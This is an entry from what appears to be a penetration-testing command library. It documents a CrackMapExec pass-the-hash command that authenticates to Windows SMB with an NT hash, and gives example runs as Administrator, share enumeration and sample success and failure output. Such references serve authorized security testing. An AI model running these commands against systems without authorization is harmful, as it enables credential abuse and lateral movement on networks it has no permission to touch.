---
id: 4caf5c41-107d-43ae-a229-fd86e5af0549
type: command
executor: bash
data: 'crackmapexec smb $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"'
output: null
created_at: '2023-04-06T03:56:30.721686+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - smb
verified: true
validated: true
---

# crackmapexec-smb-with-nt-hash

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

## Description

Tests NT hash for SMB authentication, enabling share access and execution checks on Windows file shares.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP or range | Yes |
| -u $_USERNAME | SMB username | Yes |
| -H ":$_NT_HASH" | NTLM hash | Yes |
| smb | SMB protocol (port 445) | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

### With Share Enumeration

```bash
crackmapexec smb 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --shares
```

## Expected Output

Success:

SMB                 192.168.1.100:445     100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [+] Windows 10.0 Build 19041 (name:SERVER01) (domain:corp.local)

Failure:

SMB                 192.168.1.100:445     100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [-] STATUS: LOGON_FAILURE

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
